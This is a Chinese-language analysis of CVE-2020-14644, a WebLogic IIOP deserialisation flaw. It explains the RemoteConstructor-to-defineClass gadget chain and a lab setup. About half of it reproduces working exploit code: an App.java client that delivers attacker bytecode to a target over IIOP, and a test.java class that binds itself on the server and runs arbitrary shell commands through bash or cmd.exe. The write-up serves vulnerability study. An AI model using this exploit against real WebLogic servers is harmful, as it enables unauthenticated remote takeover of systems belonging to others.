# CVE-2020-14644 Weblogic 远程命令执行漏洞分析

> author = wizard

## 背景

### 环境

weblogic是一个application server，确切来说是一个基于JAVAEE架构的中间件。CVE-2020-14644漏洞成因在于WebLogic的核心`coherence`组件存在严重的安全漏洞，攻击者可以在无需账户登录的情况下，通过发送恶意的IIOP协议数据包，进行反序列化攻击完成远程任意命令执行。Weblogic IIOP协议默认开启，跟T3协议一起监听在7001端口。

受到影响的版本：

* Oracle WebLogic Server 12.2.1.3.0
* Oracle WebLogic Server12.2.1.4.0
* Oracle WebLogic Server14.1.1.0.0

### 前置知识

#### 序列化与反序列化

**iiop**：CORBA对象之间交流的协议，传输层为TCP/IP。它提供了CORBA客户端和服务端之间通信的标准。

**Java序列化**：把java对象转换为字节序列的过程(ObjectOutputStream类的 writeObject() 方法可以实现序列化)。作用：对象的寿命通常随着生成该对象的程序的终止而终止，有时候需要把在内存中的各种对象的状态（也就是实例变量，不是方法）保存下来，并且可以在需要时再将对象恢复。Java提供了一种保存对象状态的机制，那就是序列化。

**Java反序列化**：把字节序列恢复为 Java 对象的过程(ObjectInputStream 类的 readObject() 方法用于反序列化)。

#### 协议

**IDL**：接口定义语言，用于描述软件组件的应用程序编程接口的一种规范语言。IDL完成了与各种编程语言无关的方式描述接口，从而实现了不同语言之间的通信，这样就保证了跨语言跨环境的远程对象调用。

**RMI**：java远程方法调用，是java中一种实现远程过程调用的应用程序编程接口。RMI可以使客户机上运行的程序可以调用远程服务器上的对象。

**JRMP**：用于查找、引用远程对象的协议，该协议运行在RMI之下，TCP/IP协议之上。

**JNDI**：java的一个目录服务应用程序接口	

**GIOP**：通用对象请求协议，是CORBA用来进行数据传输的协议。通过TCP协议传输的GIOP数据可以称为**IIOP**

**CORBA**：公共对象请求代理体系结构，为了解决不同应用程序间的通信。分为三个部分：`naming service`，`client side`，`servant side`。

## 复现细节

### 环境搭建

[环境搭建脚本](https://github.com/QAX-A-Team/WeblogicEnvironment)

weblogic版本：12.2.1.3.0

jdk版本：jdk_1.8.0_261

搭建成功效果：

![](https://github.com/zhenghaodong/picture/raw/master/16.PNG)

配置远程调试步骤：

* 将远程调试需要的目录从已运行的容器复制到本机：`docker cp fbf1398f7f59:/u01/app/oracle/middleware/ ./middleware/`
* intellij配置：

![](https://github.com/zhenghaodong/picture/raw/master/17.PNG)

![](https://github.com/zhenghaodong/picture/raw/master/18.PNG)

![](https://github.com/zhenghaodong/picture/raw/master/19.PNG)

正常情况下通过 7001 端口发送 HTTP 协议时会响应 HTTP 协议的内容，发送 T3 协议的数据包时响应 T3 的响应数据包，发送 IIOP 协议的数据包时响应 IIOP 的数据包。通过什么协议访问该端口该端口会响应对应的协议包内容。

用[exp](https://github.com/potats0/cve_2020_14644)执行输出路径测试一下环境是否搭建完成：

![](https://github.com/zhenghaodong/picture/raw/master/22.PNG)

### 细节

#### defindClass

` defineClass`是`JDK` 的 `ClassLoader` 类 中的一个方法，它可以根据类全限定名和类的字节数组，加载一个类到 `jvm` 中并返回对应的 `Class` 对象。

![](https://github.com/zhenghaodong/picture/raw/master/20.PNG)

传进的四个参数中，name代表类名；b代表二进制信息，如果name、b可控，则可以通过defineClass加载任何类，如果name和b不对应，则为一个`NoClassDefFoundError`。

#### Serializable

Serializable接口的作用是实现java序列化，只要一个类实现Serializable接口，那么这个类就可以序列化了。关于序列化，有以下总结：

- 必须实现Serializable接口或Externalizable接口的类才能进行序列化
- transient和static修饰符修饰的变量不会参与序列化和反序列化
- 反序列化对象和序列化前的对象的全类名和serialVersionUID必须一致
- 在目标类中添加私有的writeObject和readObject方法可以覆盖默认的序列化和反序列化方法
- 在目标类中添加私有的readResolve可以最终修改反序列化回来的对象，可用于单例模式防止序列化导致生成第二个对象的问题

#### 攻击者利用思路

* 首先调用Classidentity，将构造的而已信息存入m_sPackage，m_sBasename，m_sVersion中；
* 调用ClassDefination，将恶意字节流赋值到m_abClass属性；
* 反序列化数据进入RemoteConstructor类中的readResolve()方法，最终作为参数执行realize函数；
* realize函数中调用defineClass()，参数为definition；
* defineClass中获取恶意类和恶意字节流数据，调用父类ClassLoader的defineClass方法，实现自定义ClassLoader的创建。在加载过程中执行恶意代码，实现攻击。

**CVE-2020-14644中，攻击者的gadgets调用链为：**

```
RemoteConstructor:readResolve{0} ---> RemoteConstructor:newInstance{0} ---> RemotableSupport:realize{1}(RemoteConstructor) ---> RemotableSupport:defineClass{1}
```

#### weblogic代码分析

##### RemoteConstructor

RemoteConstructor类实现了ExternalizableLite接口，而ExternalizableLite接口继承了Serializable，因此RemoteConstructor类可以进行序列化。

RemoteConstructor类中还有readResolve函数，readResolve函数在readObject函数后执行，该函数会会覆盖readobject的内容。而readResolve函数的调用链如下：

```
readResolve() ---> newInstance() ---> realize()
```

因此执行readResolve()函数的本质实际上是执行realize()函数。

##### RemotableSupport

realize()函数是RemotableSupport类的一个方法。

```java
public <T> T realize(RemoteConstructor<T> constructor) {
    ClassDefinition definition = this.registerIfAbsent(constructor.getDefinition());
    Class<? extends Remotable> clz = definition.getRemotableClass();
    if (clz == null) {
        synchronized(definition) {
            clz = definition.getRemotableClass();
            if (clz == null) {
                definition.setRemotableClass(this.defineClass(definition));
            }
        }
    }
}
```

其中clz的声明是带有transient的，因此clz = null，最终函数会执行`definition.setRemotableClass(this.defineClass(definition));`这句话。

关于defineClass在Java反序列化中的应用，[这篇文章可以参考](https://xz.aliyun.com/t/2272#toc-0)。

#### EXP代码分析

[代码地址](https://github.com/potats0/cve_2020_14644)

首先整个代码的核心是App.java。

一开始首先指定具体的ip、端口、执行的命令。紧接着将test.java中定义的新类test作为参数传给ClassIdentity。通过ClassPool库将test的classname和classname对应的bytes作为参数传入ClassDefinition中，构建RemoteConstructor对象constructor。最后将IIOP数据包发送给服务端。

```java
public class App {
    public static void main(String[] args) throws Exception {
        String host = argv[0];
        String port = argv[1]
        String command = argv[2];
        //ip、端口转换成context对象
        Context iiopCtx = getInitialContext(host, port);
        try{
            iiopCtx.lookup("UnicodeSec");
        }catch (Exception e){
            //test类传入ClassIdentity，对test类进行操作
            ClassIdentity classIdentity = new ClassIdentity(org.unicodesec.test.class);
            ClassPool cp = ClassPool.getDefault();
            //获取test类的name、byte stream
            CtClass ctClass = cp.get(org.unicodesec.test.class.getName());
            ctClass.replaceClassName(org.unicodesec.test.class.getName(), org.unicodesec.test.class.getName() + "$" + classIdentity.getVersion());
            //构建remote对象，其中ClassDefinition的两个参数最终会作为defineClass的两个参数重构ClassLoader并加载
            RemoteConstructor constructor = new RemoteConstructor(
                    new ClassDefinition(classIdentity, ctClass.toBytecode()),
                    new Object[]{}
            );
            String bindName = "UnicodeSec" + System.nanoTime();
            iiopCtx.rebind(bindName, constructor);
        }
        //remote
        executeCmdFromWLC(command, iiopCtx);
    }

    private static void printUsage() {
        System.out.println("usage: java -jar cve-2020-14644.jar host port command");
        System.exit(-1);
    }

    private static void executeCmdFromWLC(String command, Context iiopCtx) throws NamingException, RemoteException {
        ClusterMasterRemote remote = (ClusterMasterRemote) iiopCtx.lookup("UnicodeSec");
        String response = remote.getServerLocation(command);
        System.out.println(response);
    }

    public static Context getInitialContext(String host, String port) throws Exception {
        String url = converUrl(host, port);
        Environment environment = new Environment();
        environment.setProviderUrl(url);
        environment.setEnableServerAffinity(false);
        Context context = environment.getInitialContext();
        return context;
    }

    public static String converUrl(String host, String port) {
        return "iiop://" + host + ":" + port;
    }
}
```

test.java：

该文件主要构件了一个test类，用于接收传入的command命令并执行调用。

```java
class test implements Remotable, ClusterMasterRemote {
    static {
        try {
            String bindName = "UnicodeSec";
            Context ctx = new InitialContext();
            test remote = new test();
            ctx.rebind(bindName, remote);
            System.out.println("installed");
        } catch (Exception var1) {
            var1.printStackTrace();
        }
    }

    public test() {

    }

    @Override
    public RemoteConstructor getRemoteConstructor() {
        return null;
    }

    @Override
    public void setRemoteConstructor(RemoteConstructor remoteConstructor) {

    }

    @Override
    public void setServerLocation(String var1, String var2) throws RemoteException {

    }

    @Override
    public String getServerLocation(String cmd) throws RemoteException {
        try {

            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            List<String> cmds = new ArrayList<String>();

            if (isLinux) {
                cmds.add("/bin/bash");
                cmds.add("-c");
                cmds.add(cmd);
            } else {
                cmds.add("cmd.exe");
                cmds.add("/c");
                cmds.add(cmd);
            }

            ProcessBuilder processBuilder = new ProcessBuilder(cmds);
            processBuilder.redirectErrorStream(true);
            Process proc = processBuilder.start();

            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            StringBuffer sb = new StringBuffer();

            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }

            return sb.toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
```

